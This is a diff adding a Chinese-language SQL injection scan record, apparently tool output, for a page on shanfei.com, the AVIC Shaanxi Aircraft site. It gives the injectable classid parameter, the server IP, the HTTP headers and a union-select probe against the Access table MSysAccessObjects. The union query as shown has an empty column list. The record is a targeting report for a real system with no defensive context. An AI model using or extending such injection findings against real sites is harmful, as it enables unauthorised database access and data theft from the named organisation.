@@ -1,0 +1,24 @@
+■漏洞信息:============================================================
+ ·URL:http://www.shanfei.com/list.asp?classid=1
+ ·页面标题：公司动态_中航工业陕飞
+ ·参数:classid=1
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:61.134.39.11
+ ·数据库:未知
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Fri, 26 Aug 2011 08:58:32 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 23919
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDASTBSQDS=MPHHHOPCKEHOKEMGOGIAFPEP; path=/
+Cache-control: private
+
+
+联合查询列数: 总共= 0  显示的列= 0
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
